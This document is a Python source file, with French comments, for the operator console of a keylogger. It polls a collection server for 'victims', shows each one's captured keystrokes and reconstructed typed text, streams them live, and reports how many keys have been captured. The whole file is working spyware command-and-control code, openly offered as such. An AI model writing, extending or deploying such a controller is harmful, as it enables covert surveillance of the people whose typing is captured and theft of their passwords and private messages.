#!/usr/bin/env python3
"""
CONTRÔLEUR - Interface ligne de commande
Consulte l'API du port 5000 #
Lance avec: python3 controller.py --server http://192.168.30.129:5000
"""

import requests
import argparse
import time
import os
from datetime import datetime


class Controller:
    """Contrôleur pour gérer les victimes"""
    
    def __init__(self, server_url):
        self.server_url = server_url
    
    def get_victims(self):
        """Récupère la liste des victimes"""
        try:
            response = requests.get(f"{self.server_url}/api/victims", timeout=5)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Erreur: HTTP {response.status_code}")
                return []
        except Exception as e:
            print(f"Erreur de connexion: {e}")
            return []
    
    def get_victim_logs(self, victim_id, limit=100):
        """Récupère les logs d'une victime"""
        try:
            response = requests.get(
                f"{self.server_url}/api/victims/{victim_id}/logs",
                params={"limit": limit},
                timeout=5
            )
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Erreur: HTTP {response.status_code}")
                return None
        except Exception as e:
            print(f"Erreur de connexion: {e}")
            return None
    
    def get_stats(self):
        """Récupère les statistiques"""
        try:
            response = requests.get(f"{self.server_url}/api/stats", timeout=5)
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception as e:
            print(f"Erreur de connexion: {e}")
            return None
    
    def display_victims(self):
        """Affiche la liste des victimes"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 80)
        print(" " * 25 + "VICTIMES ACTIVES")
        print("=" * 80)
        
        victims = self.get_victims()
        
        if not victims:
            print("Aucune victime enregistrée.")
            return
        
        print(f"{'ID':<35} {'Premier vu':<20} {'Dernier vu':<20} {'Touches':<10}")
        print("-" * 80)
        
        for v in victims:
            victim_id = v['victim_id'][:35]
            first_seen = v['first_seen'][:19]
            last_seen = v['last_seen'][:19]
            total_keys = v['total_keys']
            
            print(f"{victim_id:<35} {first_seen:<20} {last_seen:<20} {total_keys:<10}")
        
        print("-" * 80)
        print(f"Total: {len(victims)} victime(s)")
    
    def display_logs(self, victim_id, live=False):
        """Affiche les logs d'une victime"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 80)
        print(f" LOGS - Victime: {victim_id[:20]}...")
        print("=" * 80)
        
        data = self.get_victim_logs(victim_id, limit=100)
        
        if not data:
            print("Aucun log disponible.")
            return
        
        # Afficher le texte reconstruit
        print("\n[TEXTE CAPTURÉ]")
        print("-" * 80)
        text = data.get('text', '')
        if text:
            print(text[:500])  # Affiche les 500 premiers caractères
            if len(text) > 500:
                print(f"... ({len(text) - 500} caractères supplémentaires)")
        else:
            print("(aucun texte)")
        print("-" * 80)
        
        # Afficher les dernières touches
        print("\n[DERNIÈRES TOUCHES]")
        logs = data.get('logs', [])[-20:]
        for log in logs:
            ts = log['timestamp'][:19]
            key = log['key']
            print(f"{ts} | {key}")
        
        if live:
            print("\n[Mode Live - Rafraîchissement toutes les 2s - Ctrl+C pour quitter]")
            try:
                while True:
                    time.sleep(2)
                    self.display_logs(victim_id, live=False)
            except KeyboardInterrupt:
                pass
    
    def display_stats(self):
        """Affiche les statistiques"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 80)
        print(" " * 30 + "STATISTIQUES")
        print("=" * 80)
        
        stats = self.get_stats()
        
        if not stats:
            print("Erreur lors de la récupération des statistiques.")
            return
        
        print(f"\nVictimes totales    : {stats['total_victims']}")
        print(f"Victimes actives    : {stats['active_victims']}")
        print(f"Touches capturées   : {stats['total_keys']}")
        print()
    
    def main_menu(self):
        """Menu principal"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("=" * 80)
            print(" " * 25 + "CONTRÔLEUR KEYLOGGER")
            print("=" * 80)
            print()
            print("1. Lister les victimes")
            print("2. Voir les logs d'une victime")
            print("3. Mode live (streaming)")
            print("4. Statistiques")
            print("5. Quitter")
            print()
            
            choice = input("Choix: ").strip()
            
            if choice == "1":
                self.display_victims()
                input("\nAppuyez sur Entrée pour continuer...")
            
            elif choice == "2":
                self.display_victims()
                victim_id = input("\nID de la victime: ").strip()
                if victim_id:
                    self.display_logs(victim_id)
                    input("\nAppuyez sur Entrée pour continuer...")
            
            elif choice == "3":
                self.display_victims()
                victim_id = input("\nID de la victime (mode live): ").strip()
                if victim_id:
                    self.display_logs(victim_id, live=True)
            
            elif choice == "4":
                self.display_stats()
                input("\nAppuyez sur Entrée pour continuer...")
            
            elif choice == "5":
                print("\nAu revoir!")
                break
            
            else:
                print("Choix invalide.")
                time.sleep(1)


def main():
    parser = argparse.ArgumentParser(description="Contrôleur Keylogger")
    parser.add_argument("--server", default="http://192.168.30.129:5000", help="URL du serveur")
    args = parser.parse_args()
    
    print(f"[*] Connexion au serveur: {args.server}")
    
    controller = Controller(args.server)
    controller.main_menu()


if __name__ == "__main__":
    main() 
